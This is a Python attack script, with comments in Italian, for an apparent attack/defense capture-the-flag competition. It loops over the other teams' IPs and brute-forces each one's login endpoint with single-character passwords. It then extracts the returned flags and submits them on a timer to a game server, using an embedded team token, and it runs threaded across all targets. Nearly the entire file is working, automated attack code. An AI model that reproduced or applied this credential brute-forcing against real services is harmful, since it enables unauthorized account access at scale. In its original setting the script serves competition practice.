#/usr/bin/python3

import requests, time, re, string, random, datetime
from threading import Thread, Lock
from pwn import *
import json

TEAM_TOKEN = "30079879d4f6d98c63404aca4a44caaa"			# TEAM_TOKEN INVIATO PER EMAIL
MY_TEAM = "10.60.34.1"	# IP DEL MIO TEAM
NOP_TEAM = "10.60.0.1"	# IP DEL NOP TEAM

CHALLENGE_NAME = "GabibbiTowers-2"		# NOME DELLA CHALLENGE INDICATO IN flagIds
CHALLENGE_PORT = "8000"		# PORTA DELLA CHALLENGE

#######################      UTILS      ######################################

def generate_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def generate_fake_flag():
    letters = string.ascii_uppercase + string.digits
    result_str = ''.join(random.choice(letters) for i in range(31)) + "="
    return result_str

def add_noise(url, header=None, payload=None, session=None):
	if payload == None:
		if session == None:
			if header == None:
				requests.get(url, timeout=3)
			else:
				requests.get(url, headers=header, timeout=3)
		else:
			if header == None:
				session.get(url, timeout=3)
			else:
				session.get(url, headers=header, timeout=3)
	else:
		if session == None:
			if header == None:
				requests.post(url, data=payload, timeout=3)
			else:
				requests.post(url, headers=header, data=payload, timeout=3)
		else:
			if header == None:
				session.post(url, data=payload, timeout=3)
			else:
				session.post(url, headers=header, data=payload, timeout=3)

	print(f"Rumore aggiunto - {url} : {payload}")

##############################################################################

noFlagIds = {CHALLENGE_NAME: {'10.60.0.1': [''], '10.60.1.1': [''], '10.60.2.1': [''], '10.60.3.1': [''], '10.60.4.1': [''], '10.60.5.1': [''], '10.60.6.1': [''], '10.60.7.1': [''], '10.60.8.1': [''], '10.60.9.1': [''], '10.60.10.1': [''], '10.60.11.1': [''], '10.60.12.1': [''], '10.60.13.1': [''], '10.60.14.1': [''], '10.60.15.1': [''], '10.60.16.1': [''], '10.60.17.1': [''], '10.60.18.1': [''], '10.60.19.1': [''], '10.60.20.1': [''], '10.60.21.1': [''], '10.60.22.1': [''], '10.60.23.1': [''], '10.60.24.1': [''], '10.60.25.1': [''], '10.60.26.1': [''], '10.60.27.1': [''], '10.60.28.1': [''], '10.60.29.1': [''], '10.60.30.1': [''], '10.60.31.1': [''], '10.60.32.1': [''], '10.60.33.1': [''], '10.60.34.1': [''], '10.60.35.1': [''], '10.60.36.1': [''], '10.60.37.1': [''], '10.60.38.1': [''], '10.60.39.1': [''], '10.60.40.1': [''], '10.60.41.1': ['']}}

lock = Lock()


class Attacker(Thread):
	def __init__(self, ip, flagids):
		Thread.__init__(self)
		self.ip = ip
		self.flagids = flagids
		

	def run(self):
		flag_list = []
		for hint in self.flagids[CHALLENGE_NAME][self.ip]:
			try:
				flag = get_flag(self.ip, CHALLENGE_PORT, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)
	
		lock.acquire()
		flags.extend(flag_list)
		lock.release()


def exploit_with_threads(flagids):
	c = 1
	size = len(flagids[CHALLENGE_NAME])
	for ip in flagids[CHALLENGE_NAME]:
		print(f"{ip}\t-\t{c} / {size} ...")
		
		if ip == NOP_TEAM or ip == MY_TEAM:
			c += 1
			continue

		thread = Attacker(ip, flagids)
		threads.append(thread)
		thread.start()

		c += 1
	
	for thread in threads:
		thread.join()


def exploit(flagids):
	flag_list = []
	c = 1
	size = len(flagids[CHALLENGE_NAME])
	for ip in flagids[CHALLENGE_NAME]:
		print(f"{ip}\t-\t{c} / {size} ...")

		if ip == NOP_TEAM or ip == MY_TEAM:
			c += 1
			continue

		for hint in flagids[CHALLENGE_NAME][ip]:
			try:
				flag = get_flag(ip, CHALLENGE_PORT, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)

		c += 1
	return flag_list


# EXPLOIT FINALE CON USO DEI THREADS
def attack_with_threads():
	global flags
	global threads
	while True:
		flags = []
		threads = []
		print("Running exploit...")

		flagids = requests.get(f"http://10.10.0.1:8081/flagIds?service={CHALLENGE_NAME}").json()
		# flagids = noFlagIds

		exploit_with_threads(flagids)
		
		print()
		print(flags)

		now = datetime.datetime.now()
		print(f"\nPutting flags (ORA: {now.hour}:{now.minute}:{now.second})...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)

		print("Exploit ok...\n\nRepeat after sleep...")
		print("\n")

		time.sleep(100)


# EXPLOIT FINALE
def attack():
	while True:
		print("Running exploit...")

		flagids = requests.get(f"http://10.10.0.1:8081/flagIds?service={CHALLENGE_NAME}").json()
		# flagids = noFlagIds

		flags = exploit(flagids)
		
		print()
		print(flags)

		now = datetime.datetime.now()
		print(f"\nPutting flags (ORA: {now.hour}:{now.minute}:{now.second})...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)

		print("Exploit ok...\n\nRepeat after sleep...")
		print("\n")

		time.sleep(60)
	

	############################### UTILITY PER EXPLOIT ###############################
	#														 						  #
	#	- PRELEVA FLAG CON REGEX												 	  #	
	#														 						  #	
	#		- flag = re.findall("[A-Z0-9]{31}=", resp.text)[0]						  #
	#														 						  #
	#														 						  #
	#	- CHALLENGE WEB (USO DI requests)					 						  #
	# 														 						  #
	#		- session = requests.Session()					 						  #
	#														 						  #
	#		- resp = session.get(f"http://{ip}:{port}/products", timeout=1)			  #
	#														 						  #
	#		- data = {"email": hint, "password": "password"}						  #
	#		  resp = session.post(f"http://{ip}:{port}/login", data=data, timeout=1)  #
	#														 						  #
	#		- data = f"team={hint}&password=password&submit=Register"				  #
	#		  headers = {"Content-Type": "application/x-www-form-urlencoded"}		  #
	#		  resp = session.post(url, data=data, headers=headers, timeout=1)		  #
	#														 						  #
	#														 						  #
	#	- CHALLENGE NETCAT (USO DI pwntools)				 						  #
	# 														 						  #
	#		- with context.quiet:					 			  					  #
	#		  	session = remote(ip, port, timeout=1)	 			  				  #
	#			session.sendlineafter(b"> ", hint.encode(), timeout=1)			      #
	#			resp = sess_pwn.recvuntil(b"=").decode()						      #
	#														 						  #
	###################################################################################

def get_flag(ip, port, hint):
	# PASSAGGI NECESSARI A PRELEVARE UNA FLAG
    sito = f'http://{ip}:{port}'
    user = hint['username']

    trovato = False

    i = 0
    alfabeto = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

    session = requests.Session()

    while not trovato and i < len(alfabeto):
        credentials = {
        "username" : user,
        "password" : alfabeto[i]
        }

        r = session.post(f'{sito}/login', json=credentials, timeout=2)
        time.sleep(0.1)
        prova = (r.json())
        if not prova.get('detail') and prova.get('info'):
            trovato = True
            flag = prova['info']

        i += 1

	# RESTITUISCI LA FLAG
    return flag or ""
	


## TEST get_flag
def test():
	ip = "10.60.0.1"
	hint = "dSQx2pEDjeNXaqknlMPayflxbF0g"

	try:
		flag = get_flag(ip, CHALLENGE_PORT, hint)
	except Exception as e:
		print(f"ERR: {e}")
		return
	
	print(flag)
	
	# flags = [flag]
	# print("\nPutting flags...")
	# r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
	# print(r)


def main():
	# test()
	# attack()
	attack_with_threads()


main()
